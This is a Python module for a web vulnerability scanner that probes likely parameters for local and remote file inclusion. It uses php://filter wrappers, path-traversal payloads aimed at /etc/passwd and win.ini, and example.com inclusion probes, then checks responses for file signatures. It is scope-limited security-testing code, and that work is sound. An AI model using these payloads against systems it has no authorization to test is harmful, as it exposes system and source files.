"""Advanced LFI/RFI Scanner (WAF-aware, low-impact)."""
from __future__ import annotations

import asyncio
import base64
import re
from typing import List, Optional

from config.settings import Severity
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState

MAX_PARAM_TARGETS = 35
LFI_PARAMS = {
    "file", "path", "page", "template", "include", "inc", "module", "load", "view",
}

LFI_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
    "file:///etc/passwd",
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
]

RFI_PAYLOADS = [
    "https://example.com/",
    "http://example.com/",
]

LFI_SIGS = [r"root:x:0:0", r"\[fonts\]", r"\[extensions\]", r"localhost"]


class LFIRFIScanner(BaseScanner):
    name = "lfi_rfi_scanner"
    description = "Detects local/remote file inclusion with wrapper-based and encoded payloads"
    tags = ["file", "lfi", "rfi", "owasp-a05"]

    async def run(self, state: ScanState) -> List[Finding]:
        tasks = []
        count = 0

        for url, params in state.target.discovered_params.items():
            if state.target.scope and not state.target.scope.is_in_scope(url):
                continue
            for param in params:
                if param.lower() not in LFI_PARAMS:
                    continue
                tasks.append(self._check_param(url, param))
                count += 1
                if count >= MAX_PARAM_TARGETS:
                    break
            if count >= MAX_PARAM_TARGETS:
                break

        results = await asyncio.gather(*tasks, return_exceptions=True)
        findings: List[Finding] = []
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
        return findings

    async def _check_param(self, url: str, param: str) -> List[Finding]:
        findings: List[Finding] = []

        baseline_resp, _ = await self.test_payload_with_bypass(
            url,
            "GET",
            param,
            "index.php",
            vuln_type="lfi_rfi",
            inject_in="query",
        )
        baseline_text = baseline_resp.text[:8000] if baseline_resp else ""

        for payload in LFI_PAYLOADS:
            finding = await self._test_lfi_payload(url, param, payload)
            if finding:
                findings.append(finding)
                break

        for payload in RFI_PAYLOADS:
            finding = await self._test_rfi_payload(url, param, payload, baseline_text)
            if finding:
                findings.append(finding)
                break

        return findings

    async def _test_lfi_payload(self, url: str, param: str, payload: str) -> Optional[Finding]:
        resp, raw_req = await self.test_payload_with_bypass(
            url,
            "GET",
            param,
            payload,
            vuln_type="lfi_rfi",
            inject_in="query",
        )
        if not resp:
            return None

        body = resp.text

        for sig in LFI_SIGS:
            m = re.search(sig, body, re.IGNORECASE)
            if m:
                return self.make_finding(
                    title=f"Local File Inclusion in '{param}'",
                    vuln_type="lfi_wrapper",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=f"File signature detected: {m.group(0)}",
                    request=raw_req,
                    response=body[:400],
                    cwe_id="CWE-98",
                    owasp_category="A05:2021 - Security Misconfiguration",
                )

        if payload.startswith("php://filter"):
            decoded = self._decode_possible_base64(body)
            if decoded and "<?php" in decoded.lower():
                return self.make_finding(
                    title=f"PHP source disclosure via wrapper in '{param}'",
                    vuln_type="lfi_wrapper",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence="Response decodes to PHP source",
                    request=raw_req,
                    response=decoded[:400],
                    cwe_id="CWE-98",
                    owasp_category="A05:2021 - Security Misconfiguration",
                )

        return None

    async def _test_rfi_payload(
        self,
        url: str,
        param: str,
        payload: str,
        baseline_text: str,
    ) -> Optional[Finding]:
        resp, raw_req = await self.test_payload_with_bypass(
            url,
            "GET",
            param,
            payload,
            vuln_type="lfi_rfi",
            inject_in="query",
        )
        if not resp:
            return None

        body = resp.text
        if "Example Domain" in body and "Example Domain" not in baseline_text:
            return self.make_finding(
                title=f"Potential Remote File Inclusion in '{param}'",
                vuln_type="rfi_remote_include",
                severity=Severity.CRITICAL,
                url=url,
                parameter=param,
                payload=payload,
                evidence="Remote marker 'Example Domain' appeared in server response",
                request=raw_req,
                response=body[:400],
                cwe_id="CWE-98",
                owasp_category="A05:2021 - Security Misconfiguration",
            )
        return None

    @staticmethod
    def _decode_possible_base64(body: str) -> Optional[str]:
        candidate = re.sub(r"[^A-Za-z0-9+/=]", "", body)[:12000]
        if len(candidate) < 64:
            return None
        try:
            decoded = base64.b64decode(candidate + "===", validate=False)
            text = decoded.decode(errors="ignore")
            if len(text.strip()) > 20:
                return text
        except Exception:
            return None
        return None
